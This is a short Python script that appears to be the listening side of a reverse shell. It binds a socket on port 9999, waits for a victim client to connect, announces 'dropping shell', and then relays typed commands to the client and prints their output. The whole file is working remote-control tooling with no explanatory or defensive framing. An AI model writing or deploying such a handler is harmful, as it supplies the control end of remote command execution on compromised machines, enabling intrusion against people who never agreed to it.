import socket
import time
from colorama import *



class Server:

    def __init__(self):
        self.sock = 0
        self.con = 0
    

    def start(self):

        print(Fore.GREEN + "Starting server" + Fore.RESET)

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        self.sock.bind(("127.0.0.1", 9999))

        self.sock.listen(1)

        while True:
            
            self.con, addr = self.sock.accept()
            rdata = self.con.recv(4096)

            if rdata:
                print("Connection received from client, dropping shell")
                while True:
                    j = input(">")
                    if j == "":
                        continue
                    self.con.send(j.encode())
                    dat = self.con.recv(4096)

                    if len(dat) > 0:
                        print(dat.decode())
                    else: continue


                

s = Server()

s.start()